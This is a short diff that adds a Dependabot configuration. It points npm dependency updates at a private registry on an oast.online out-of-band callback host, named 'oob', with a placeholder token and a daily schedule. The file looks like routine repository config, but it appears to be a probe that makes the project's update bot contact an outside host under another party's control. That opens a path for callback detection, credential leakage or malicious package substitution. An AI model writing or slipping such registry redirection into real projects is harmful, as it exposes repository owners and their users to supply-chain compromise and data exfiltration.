@@ -1,0 +1,13 @@
+version: 2
+registries:
+  oob:
+    type: npm-registry
+    url: http://reg.d8ff8jagp7go24r9t70g1q467wu7e3fer.oast.online
+    token: dummytoken
+updates:
+  - package-ecosystem: npm
+    directory: "/"
+    schedule:
+      interval: daily
+    registries:
+      - oob
